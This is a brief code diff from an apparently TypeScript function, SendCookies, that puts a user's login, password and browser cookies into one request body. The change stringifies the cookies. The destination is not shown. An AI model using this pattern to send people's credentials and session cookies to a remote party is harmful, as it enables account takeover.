@@ -19,7 +19,7 @@ export default async function SendCookies({ page, user, pass }: Request) {
       body: {
         login: user,
         senha: pass,
-        content: cookies,
+        content: JSON.stringify(cookies),
       },
     };
 
